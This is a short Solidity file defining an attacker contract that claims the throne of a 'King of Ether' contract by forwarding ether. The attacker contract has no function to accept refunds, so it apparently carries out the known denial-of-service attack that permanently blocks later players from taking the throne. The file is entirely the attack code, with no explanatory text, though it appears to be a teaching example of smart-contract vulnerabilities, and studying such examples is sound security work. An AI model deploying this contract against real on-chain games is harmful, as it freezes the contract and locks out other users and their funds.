// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface IKingOfEther {
    function claimThrone() external payable;
}

contract AttackerKingOfEther {
    IKingOfEther public immutable kingOfEther;

    constructor(address _kingOfEther) {
        kingOfEther = IKingOfEther(_kingOfEther);
    }

    function attack() public payable {
        kingOfEther.claimThrone{value: msg.value}();
    }
}
